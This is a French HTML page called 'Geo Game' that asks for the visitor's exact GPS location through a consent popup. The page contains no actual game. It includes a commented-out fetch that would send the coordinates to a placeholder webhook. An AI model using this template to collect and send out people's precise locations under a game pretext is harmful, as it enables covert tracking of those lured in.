<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Geo Game</title>
    <style>
        /* POPUP FOND */
        #geoPopup {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            font-family: Arial, sans-serif;
        }

        /* BOITE */
        #geoBox {
            background: white;
            width: 300px;
            padding: 20px;
            border-radius: 12px;
            text-align: center;
            animation: fadeIn 0.3s;
        }

        /* BOUTONS */
        .geoBtn {
            padding: 10px 20px;
            margin: 10px;
            border-radius: 8px;
            border: none;
            color: white;
            font-size: 15px;
            cursor: pointer;
        }

        #acceptGeo { background: #28a745; }
        #denyGeo { background: #dc3545; }

        @keyframes fadeIn {
            from {opacity: 0;}
            to   {opacity: 1;}
        }
    </style>
</head>
<body>

    <!-- POPUP DEMANDE DE CONSENTEMENT -->
    <div id="geoPopup">
        <div id="geoBox">
            <h3>üìç Localisation requise</h3>
            <p>
                Ce jeu a besoin de votre position exacte (GPS).<br><br>
                Acceptez-vous de partager votre localisation ?
            </p>

            <button class="geoBtn" id="acceptGeo">Accepter</button>
            <button class="geoBtn" id="denyGeo">Refuser</button>
        </div>
    </div>

    <script>
        // Quand l‚Äôutilisateur accepte
        document.getElementById("acceptGeo").onclick = () => {
            document.getElementById("geoPopup").style.display = "none";

            // DEMANDE GPS DU NAVIGATEUR
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;

                    console.log("Latitude :", lat);
                    console.log("Longitude :", lon);
                    console.log("Pr√©cision :", acc);

                    alert("Position obtenue ‚úîÔ∏è Le jeu commence !");

                    // üëâ ENVOI WEBHOOK (OPTIONNEL)
                    /*
                    fetch("TON_WEBHOOK_ICI", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            username: "GeoGame",
                            content: "Nouvel utilisateur",
                            embeds: [{
                                title: "Position exacte (avec consentement)",
                                description:
                                  `Latitude : ${lat}\n` +
                                  `Longitude : ${lon}\n` +
                                  `Pr√©cision : ${acc}m`,
                                color: 0x00ff99
                            }]
                        })
                    });
                    */
                },

                // L‚Äôutilisateur refuse sur le navigateur
                () => {
                    alert(
                        "Vous avez refus√© la localisation dans votre navigateur.\n" +
                        "Le jeu ne peut pas d√©marrer."
                    );
                },

                // Options pour pr√©cision maximale
                { enableHighAccuracy: true, timeout: 10000 }
            );
        };

        // Quand l‚Äôutilisateur refuse sur la popup
        document.getElementById("denyGeo").onclick = () => {
            document.getElementById("geoPopup").style.display = "none";
            alert("Vous avez refus√©. Le jeu ne peut pas d√©marrer.");
        };
    </script>

</body>
</html>
